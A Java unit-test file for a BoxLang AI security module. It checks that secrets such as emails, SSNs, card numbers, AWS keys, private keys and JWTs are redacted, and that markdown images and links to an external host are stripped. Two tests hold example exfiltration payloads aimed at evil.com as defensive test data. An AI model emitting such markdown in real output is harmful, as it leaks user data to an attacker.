package ortus.boxlang.ai.security;

import static com.google.common.truth.Truth.assertThat;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import ortus.boxlang.ai.BaseIntegrationTest;
import ortus.boxlang.runtime.scopes.Key;

@DisplayName( "PromptSecurity Redactor / Exfil / Resolver Tests (Phase 3)" )
public class PromptSecurityRedactTest extends BaseIntegrationTest {

	@DisplayName( "redactSecrets: masks an email address" )
	@Test
	public void testRedactEmail() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        out = PromptSecurity::redactSecrets( "Contact me at john.doe@example.com please" );
		        masked   = out.text.contains( "[REDACTED]" );
		        gone     = !out.text.contains( "john.doe@example.com" );
		        findings = out.findings.len();
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
		assertThat( variables.getAsBoolean( Key.of( "gone" ) ) ).isTrue();
		assertThat( variables.getAsInteger( Key.of( "findings" ) ) ).isEqualTo( 1 );
	}

	@DisplayName( "redactSecrets: masks an SSN" )
	@Test
	public void testRedactSSN() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        out    = PromptSecurity::redactSecrets( "SSN is 123-45-6789 on file" );
		        masked = out.text.contains( "[REDACTED]" ) && !out.text.contains( "123-45-6789" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "redactSecrets: valid Luhn credit card is masked" )
	@Test
	public void testRedactCreditCardValidLuhn() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        // 4111 1111 1111 1111 is a valid Luhn Visa test number
		        out    = PromptSecurity::redactSecrets( "card 4111111111111111 charged" );
		        masked = out.text.contains( "[REDACTED]" ) && !out.text.contains( "4111111111111111" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "redactSecrets: invalid Luhn credit card is NOT masked" )
	@Test
	public void testRedactCreditCardInvalidLuhn() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        // 4111111111111112 fails the Luhn checksum → should pass through untouched
		        out   = PromptSecurity::redactSecrets( "number 4111111111111112 here" );
		        kept  = out.text.contains( "4111111111111112" ) && !out.text.contains( "[REDACTED]" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "kept" ) ) ).isTrue();
	}

	@DisplayName( "redactSecrets: masks an AWS access key" )
	@Test
	public void testRedactAwsAccessKey() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        out    = PromptSecurity::redactSecrets( "key AKIAIOSFODNN7EXAMPLE leaked" );
		        masked = out.text.contains( "[REDACTED]" ) && !out.text.contains( "AKIAIOSFODNN7EXAMPLE" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "redactSecrets: masks a private key block" )
	@Test
	public void testRedactPrivateKeyBlock() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        block  = "-----BEGIN RSA PRIVATE KEY-----" & char(10) & "MIIabc123" & char(10) & "-----END RSA PRIVATE KEY-----";
		        out    = PromptSecurity::redactSecrets( "here it is " & block );
		        masked = out.text.contains( "[REDACTED]" ) && !out.text.contains( "MIIabc123" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "redactSecrets: masks a JWT" )
	@Test
	public void testRedactJwt() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        jwt    = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5Nabc";
		        out    = PromptSecurity::redactSecrets( "token " & jwt );
		        masked = out.text.contains( "[REDACTED]" ) && !out.text.contains( jwt );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "redactSecrets: masks a generic api token" )
	@Test
	public void testRedactGenericApiToken() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        out    = PromptSecurity::redactSecrets( "api_key: abcdefghijklmnopqrstuvwx1234567890" );
		        masked = out.text.contains( "[REDACTED]" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "redactSecrets: clean text yields no findings" )
	@Test
	public void testRedactCleanText() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        out    = PromptSecurity::redactSecrets( "The quick brown fox jumps over the lazy dog." );
		        clean  = out.findings.isEmpty() && out.text == "The quick brown fox jumps over the lazy dog.";
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "clean" ) ) ).isTrue();
	}

	@DisplayName( "redactSecrets: custom redactor is honored" )
	@Test
	public void testRedactCustom() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        out    = PromptSecurity::redactSecrets(
		            text     : "internal code ACME-12345 disclosed",
		            redactors: [],
		            mask     : "[REDACTED]",
		            custom   : { "acmeCode": "ACME-[0-9]+" }
		        );
		        masked = out.text.contains( "[REDACTED]" ) && !out.text.contains( "ACME-12345" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "stripExfil: removes a markdown image to a non-allowlisted host" )
	@Test
	public void testStripExfilImage() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        out      = PromptSecurity::stripExfil( "See ![leak](https://evil.com/track?d=secret) now" );
		        stripped = !out.text.contains( "evil.com" ) && out.findings.len() == 1;
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "stripped" ) ) ).isTrue();
	}

	@DisplayName( "stripExfil: keeps a markdown image on an allowlisted host" )
	@Test
	public void testStripExfilAllowlisted() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        out  = PromptSecurity::stripExfil(
		            text             : "logo ![ok](https://cdn.mysite.com/logo.png) here",
		            stripImages      : true,
		            stripLinks       : false,
		            allowedImageHosts: [ "mysite.com" ]
		        );
		        kept = out.text.contains( "cdn.mysite.com" ) && out.findings.isEmpty();
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "kept" ) ) ).isTrue();
	}

	@DisplayName( "stripExfil: rewrites an external link to its text when enabled" )
	@Test
	public void testStripExfilLink() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        out    = PromptSecurity::stripExfil(
		            text       : "click [here](https://evil.com/steal?d=x) now",
		            stripImages: false,
		            stripLinks : true
		        );
		        rewrote = !out.text.contains( "evil.com" ) && out.text.contains( "here" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "rewrote" ) ) ).isTrue();
	}

	@DisplayName( "getResponseText: resolves OpenAI-shaped result" )
	@Test
	public void testGetResponseTextOpenAI() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        ctx  = { "result": { "choices": [ { "message": { "content": "hello world" } } ] } };
		        text = PromptSecurity::getResponseText( ctx );
		        ok   = text == "hello world";
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "ok" ) ) ).isTrue();
	}

	@DisplayName( "getResponseText: resolves streaming content" )
	@Test
	public void testGetResponseTextStreaming() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        ctx  = { "streamState": { "content": "streamed text" } };
		        text = PromptSecurity::getResponseText( ctx );
		        ok   = text == "streamed text";
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "ok" ) ) ).isTrue();
	}

	@DisplayName( "setResponseText: writes OpenAI-shaped result in place" )
	@Test
	public void testSetResponseTextOpenAI() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        ctx     = { "result": { "choices": [ { "message": { "content": "old" } } ] } };
		        written = PromptSecurity::setResponseText( ctx, "new" );
		        ok      = written && ctx.result.choices[ 1 ].message.content == "new";
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "ok" ) ) ).isTrue();
	}
}
